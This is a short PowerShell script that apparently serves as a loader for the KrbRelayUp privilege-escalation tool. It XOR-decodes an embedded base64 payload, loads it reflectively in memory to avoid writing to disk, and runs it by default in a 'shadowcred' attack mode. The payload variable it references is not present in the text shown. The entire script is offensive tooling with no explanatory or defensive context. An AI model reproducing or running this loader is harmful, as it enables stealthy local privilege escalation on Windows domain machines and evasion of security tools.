function Load-XLdr_KrbRelayUp { param([Parameter ()] $xk = "0x1f")
$loadedAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Fullname -eq "KrbRelayUp, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" }
if ($loadedAssembly) {
  return $loadedAssembly[0]  
}
$xk -eq "" -and ($xk = Read-Host "Specify XorKey")
$fb = [Convert]::FromBase64String($e969eb4e)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor $xk}
$asm_XLdr_KrbRelayUp = [System.Reflection.Assembly]::Load($fb)
return $asm_XLdr_KrbRelayUp
}
function Invoke-XLdr_KrbRelayUp { param([Parameter ()] $Params = "full -m shadowcred --ForceShadowCred")
$asm = Load-XLdr_KrbRelayUp
$Params -eq "" -and ($Params = Read-Host "Specify command arguments")
$asm.EntryPoint.Invoke($null, (, $Params.split()))
}